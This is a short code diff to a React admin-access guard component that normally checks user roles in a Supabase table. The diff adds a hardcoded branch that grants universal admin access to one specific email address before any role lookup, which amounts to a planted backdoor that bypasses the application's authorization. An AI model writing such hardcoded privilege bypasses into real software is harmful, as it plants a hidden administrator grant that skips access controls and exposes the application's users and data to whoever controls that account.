@@ -22,6 +22,12 @@ const AdminAccessGuard: React.FC<AdminAccessGuardProps> = ({ children, fallback 
 
       setUser(user);
 
+      // OWNER ACCOUNT: craven@usa.com has universal admin access
+      if (user.email === 'craven@usa.com') {
+        setIsAdmin(true);
+        return;
+      }
+
       const { data, error } = await (supabase as any)
         .from('user_roles')
         .select('role')
